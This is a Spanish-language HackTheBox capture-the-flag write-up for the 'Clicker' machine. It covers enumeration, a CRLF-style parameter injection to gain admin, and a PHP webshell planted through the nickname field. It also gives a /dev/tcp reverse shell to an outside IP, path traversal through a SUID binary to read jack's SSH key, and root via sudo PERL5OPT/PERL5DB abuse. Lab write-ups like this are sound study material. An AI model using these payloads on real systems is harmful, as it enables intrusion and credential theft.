---
layout: default
title: Clicker
parent: HackTheBox
grand_parent: Writeups
---

# Clicker
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Enumeracion

Iniciamos con un escaneo con nmap donde encontraremos  varios puertos abiertos

```ruby
nmap -sS -n -Pn --open -p- 10.10.11.232
```

```ruby
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
34651/tcp open  unknown
46653/tcp open  unknown
49257/tcp open  unknown
51567/tcp open  unknown
53719/tcp open  unknown
```

Ahora escanearemos para obtener mas informacion sobre la version  y servicio que esta corriendo 

```ruby
nmap -sCV -p22,80,111,2049,34651,46653,49257,51567,53719 10.10.11.232
```

```ruby
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://clicker.htb/
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      51276/udp6  mountd
|   100005  1,2,3      51567/tcp   mountd
|   100005  1,2,3      53286/udp   mountd
|   100005  1,2,3      57619/tcp6  mountd
|   100021  1,3,4      42583/tcp6  nlockmgr
|   100021  1,3,4      44155/udp6  nlockmgr
|   100021  1,3,4      46653/tcp   nlockmgr
|   100021  1,3,4      46689/udp   nlockmgr
|   100024  1          35700/udp6  status
|   100024  1          47291/tcp6  status
|   100024  1          53719/tcp   status
|   100024  1          59549/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
```

Viendo los resultados, en el puerto 80 nos dice que nos redirije a **clicker.htb** por lo que hay que agregarlo el /etc/hosts para que pueda resolver. Tambien podemos ver que tenemos el puerto 111 (rcp) y el 2049(NFS), por lo que haremos uso de **showmount** para ver los recursos compartidos

```ruby
showmount -e 10.10.11.232
```
```ruby
Export list for 10.10.11.232:
/mnt/backups *
```
Ahora montaremos ese recursos en nuestra maquina

```ruby
mount -t nfs 10.10.11.232:/mnt/backups /mnt/clicker/
```

Encontraremos un archivo .zip que el descomprimirlo parece ser un backup del sitio web. 

### Sitio web clicker.htb

Al explorar el sitio web, podremos ver que nos podemos registrar, iniciar sesion, y jugar. En la ventada de **play** podemos dar click y guardar nuestro progreso, en este punto podemos interceptar la peticion que se hace cuando guardamos nuestros progreso haciendo uso de burpsuite

![](/assets/img/clicker/1.png)

Podemos ver que se manda a llamar al archivo **save_game** y le manda dos parametros: 

```ruby
GET /save_game.php?clicks=29&level=0 HTTP/1.1
```
Asi que analizaremos ese archivo

### save_game.php

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
}
?>
```
- **if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "")**: Se verifica la existencia la sesion llamada PLAYER ademas de verificar si su contenido no esta vacio, seguramente para saber si el jugador inicio sesion

- **foreach($_GET as $key=>$value)**: Se usar foreach para recorrer todos los parametros de la peticion que se hace por GET, en nuestro caso, los clicks y el nivel

- **if (strtolower($key) === 'role')**: Si cuando recorre los parametros encuentra uno con nombre "role" se redirige el index.php

Y lo demas es para guardar el valor de los parametros y actualizar los valores de la sesion PLAYER

Sabiendo esto, debemos de encontrar una forma de hacernos **Admin**

## CRLF Injection

Las siglas CRLF son de retorno de carro (CR) y salto de linea (LF). Estos caracteres que sin "invisibles" se usan para indicar cuando inicar y cuando termina un encabezados.

CRLF injection es una vulnerabilidad que permite inyectar estos caracteres para manipular los encabezados, asi engañando a la aplicacion web e indicarle que un encabezado o valor de estos, ha terminado o comenzado.

Sabiendo esto, en la peticion web podemos agregar el caracter **%0A** (line feed) para indicarle el comienzo de un nuevo parametro en esa peticion, por lo que quedaria asi:

```ruby
GET /save_game.php?clicks=29&level=0&role%0a=Admin HTTP/1.1
```

En burpsuite en la pestaña proxy modificamos la peticion y le damos **forward** , cerramos y volvemos  a iniciar sesion y ya seremos admin

![](/assets/img/clicker/2.png)

Una vez que seamos admin, veremos que podemos exportar los resultados en formato txt, json y html y nos genera una ruta como esta: **exports/top_players_fl8moszw.txt**

Si vemos le peticion, podemos ver que manda a llamar el archivo **exports.php** y tambien le manda la extension como parametro

```ruby
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://clicker.htb
Connection: close
Referer: http://clicker.htb/admin.php?msg=Data%20has%20been%20saved%20in%20exports/top_players_fl8moszw.txt
Cookie: PHPSESSID=f131nr6f06m2ocr5i3ap1gbt3h
Upgrade-Insecure-Requests: 1

threshold=1000000&extension=txt
```

Sabiendo esto, podriamos intentar cambiar la extension a PHP para intentar ejecutar codigo PHP, pero antes, en el archivo **exports.php** podemos ver que cuando se selecciona uno de los formatos para exportar, existe otro parametro con el nombre de **nickname** (ejemplo del codigo del formato TXT)

```php
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
```

Asi mismo en el archivo **authenticate.php** tambien podemos ver la existencia de ese parametro:

```php
if(check_auth($_POST['username'], $_POST['password'])) {
		$_SESSION["PLAYER"] = $_POST["username"];
		$profile = load_profile($_POST["username"]);
		$_SESSION["NICKNAME"] = $profile["nickname"];
		$_SESSION["ROLE"] = $profile["role"];
		$_SESSION["CLICKS"] = $profile["clicks"];
		$_SESSION["LEVEL"] = $profile["level"];
		header('Location: /index.php');
```

Haremos lo mismo que en la parte de CRLF injection, pero agregando ese nuevo parametro, por lo que la peticion quedaria asi:

```ruby
GET /save_game.php?clicks=29&level=0&nickname=<%3fphp+system($_GET['comando'])+%3f> HTTP/1.1
```
Y en la parte para exportar el resultado volvemos a interceptar la peticion y le cambiamos el formato a PHP

Podemos ver que se puso en formato PHP

![](/assets/img/clicker/3.png)

Y al ingresar a la URL, veremos que hecmos conseguido RCE:

![](/assets/img/clicker/4.png)

Ahora solo queda enviarnos  una reverse shell

```ruby
echo "sh -i >& /dev/tcp/10.10.15.96/443 0>&1" | base64
```

Y en la URL ponemos: ?comando=echo "<base64>" | base64 -d | bash

Y nos deberia de llegar

![](/assets/img/clicker/5.png)

## www-data -> jack

Si buscamos por binarios SUID, podemos ver el **/opt/manage/execute_query** 

```ruby
find / -perm -u=s -type f 2>/dev/null
/opt/manage/execute_query
```

Al hacerle un **file** podemos ver que es un binario ELF:

```ruby
execute_query: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped
```
Tambien existe un txt que dice:

```
Web application Management

Use the binary to execute the following task:
	- 1: Creates the database structure and adds user admin
	- 2: Creates fake players (better not tell anyone)
	- 3: Resets the admin password
	- 4: Deletes all users except the admin
```

### Analisis del binario

En mi caso suelo usar binaryninja

Primero el binario verifica si existe un argumento cuando fue ejecutado

```c
if (argc s<= 1)
    puts(str: "ERROR: not enough arguments")
rax_2 = 1
```

Este argumento se almacena en **rax_6** cuando se usa la funcion **atoi**

```c
int32_t rax_6 = atoi(nptr: argv[1])
```

Despues usando **calloc()** reverva en tiempo de ejecucion 20 bytes de memoria en el heap, esto devuelve un puntero al espacio que se reservó, en este caso  se almacena en **rax_7**

```c
char* rax_7 = calloc(n: 0x14, elem_size: 1)
```

Posteriormente se entra en un switch-case de 5 opciones (contando el case por default)

![](/assets/img/clicker/8.png)

En cada case (sin contar el 0), se hace uso de la funcion **strncpy** para copiar la cadena del segundo parametro al espacio al que apunta **rax_7**, en el codigo, los case 1 al 4, copian una cadena que corresponde a un archivo sql

Sin embargo, en el case por default se usa **strncpy** para copiar el segundo argumento del programa (**argv[2]**) en el espacio al que apunta **rax_7**

Un poco mas abajo, se hace un if para verificar si **rax_6** es una del las opciones del case:

```c
if (rax_6 u> 4 || rax_6 == 1 || rax_6 == 2 || rax_6 == 3 || rax_6 == 4)
```

Despues se declara la variable **var_98** y en la linea de abajo se copia la cadena **/home/jack/queries** a **var_98**

```c
int64_t var_98
__builtin_strcpy(dest: &var_98, src: "/home/jack/queries/")
```

Viendo el directorio **/home/jack/queries/** podemos deducir que el contexto de ejecucion es en ese directorio.

La vulnerabilidad en este codigo radica en el case por default

```c
default
    strncpy(rax_7, argv[2], 0x14)
```

Como mencione anteriormente, cuando se usa el case por default ahora el programa recibe dos argumentos y lo copia al espacio en memoria al que apunta **rax_7**, el problema es que a la funcion **strncpy** no se le especifica que copie una cadena en especifico, como en los demas case, si no que copia el segundo argumento. Para explotarlo debemos de ejecutar el programa pasandole un argumento que ejecute el case por default (numero mayor a 4 no importa cual sea)

![](/assets/img/clicker/9.png)

Y podemos ver como se ocasiona una violacion de segmento, lo otro que tenemos que hacer pasarle la ruta de un archivo, por ejemplo el **passwd** y vamos a poder leerlo

```ruby
./execute_query 12 ../../../etc/passwd
```
![](/assets/img/clicker/10.png)

Observa que tuve que usar **../** para salir del directorio **/home/jack/queries/**

Ahora, como sabemos que existe el **jack** podemos intentar leer su id_rsa

![](/assets/img/clicker/11.png)

Para conectarse por SSH, la clave privada esta mal formateada, puedes generar un par de claves con ssh-keygen y compararlas

## Escalada de privilegios

Si mostramos los permisos de nivel de sudoers, veremos que podemos ejecutar el script **monitor.sh** como root sin contraseña: 

```ruby
User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```
Codigo:

```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```
Este script parece hacer un tipo diagnostico y lo guarda en el archivo  **/root/diagnostic_files/diagnostic...**, sin embargo, podemos ver que hace uso de variables de entorno de perl (PERL5LIB, PERLLIB), en este caso usa **unset** para eliminar esas variables de entorno en tiempo de ejecucion. Tomando en cuenta el uso de variables de entorno de perl y el uso de **/usr/bin/xml_pp** (otro script de perl), nosotros podemos abusar de las variables de entorno de perl para ejecutar comandos, mas en particular de **PERL5DB** y **PERL5OPT**, esta vulnerabilidad se le conoce como **perl_startup**

Para explotarla podemos ingresar:

```perl
sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
```

- PERL5OPT=-d: se establece la variable de entorno **PERLOPT5** con el argumento -d, que significa modo de depuracion,
- Posteriormente se establece la variable de entorno **PERL5DB** con el valor de **exec** para ejecutar el comando que sigue

Basicamente lo que estara haciendo es ejecutar el script **monitor.sh** en modo de depuracion, y tomando en cuenta que podemos establecer variables de entorno, usamos **PERL5OPT** y **PERL5DB**  para ejecutar un comando arbitrario a la hora de depurar el script

Ahora solo queda ejecutar **bash -p** y seremos root

![](/assets/img/clicker/12.png)

Eso ha sido todo, gracias por leer ❤
